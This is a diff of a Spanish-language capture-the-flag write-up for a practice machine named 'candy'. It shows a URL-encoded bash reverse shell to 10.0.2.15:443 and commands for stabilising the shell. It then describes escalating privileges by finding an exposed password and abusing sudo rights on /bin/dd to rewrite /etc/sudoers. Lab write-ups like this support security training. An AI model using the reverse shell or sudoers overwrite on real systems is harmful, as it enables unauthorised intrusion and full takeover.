@@ -71,5 +71,36 @@ bash -c 'bash -i >%26 /dev/tcp/10.0.2.15/443 0>%261'
 
 <img width="1019" height="316" alt="candy14" src="https://github.com/user-attachments/assets/66d78beb-fc52-4070-84c1-e6f81a23238b" />
 
+Ya en la máquina víctima, procederemos a realizar tratamiento de la TTY, para que tengamos una terminal estable, que podamos ejecutar CTRL + L y se nos limpie la pantalla, que podamos ejecutar CTRL + C y la reverse shell no se caíga, esto lo haremos con los siguientes comandos:
+
+```bash
+script /dev/null -c bash
+CTRL + Z
+stty raw -echo;fg
+reset xterm
+export TERM=xterm && export SHELL=bash
+stty rows 50 columns 236
+```
 
 ## 🔑 ESCALADA DE PRIVILEGIOS
+
+El primer paso para llegar a root, será revisar el archivo /etc/passwd para ver si exísten más usuarios, vemos que exíste el usuario luisillo, ejecutamos sudo -l para ver si tenemos privilegios a nivel de sudoers, pero nada, en este punto nos ponemos a revisar directorios básicos como /tmp /opt /var, y dentro del último encontramos un archivo crítico, donde exponen la password del usuario luisillo.
+
+<img width="1170" height="613" alt="candy15" src="https://github.com/user-attachments/assets/7465c28c-115f-45b0-8acd-3a5e1c5def31" />
+
+<img width="1170" height="633" alt="candy16" src="https://github.com/user-attachments/assets/6f9fa48c-47eb-4990-bd0b-3fdf88772f81" />
+
+<img width="1170" height="633" alt="candy17" src="https://github.com/user-attachments/assets/d6398985-eba1-473f-998d-d8da39ee827a" />
+
+Nos convertimos en luisillo y ejecutamos sudo -l y vemos que podemos ejecutar el binario /bin/dd como root, nos dirigiremos a la web gtfobins.org para buscar comandos de dicho binario y encontramos que podemos escribir archivos y leer archivos.
+
+<img width="1036" height="291" alt="candy18" src="https://github.com/user-attachments/assets/72b3ad07-70a8-433b-9f2d-c3f7f9119db7" />
+
+<img width="1213" height="626" alt="candy19" src="https://github.com/user-attachments/assets/9398dea2-20ae-4a74-a5d2-50fd67687793" />
+
+Lo primero que se ocurre es indicarle al archivo /etc/sudoers que nos de privilegios para subir a root sin usar contraseña, esto de la siguiente manera:
+
+<img width="1051" height="245" alt="candy20" src="https://github.com/user-attachments/assets/d3068ba4-9171-4fff-881f-d1c2c4420ba4" />
+
+¡Ya somos root!, máquina hackeada.-
+
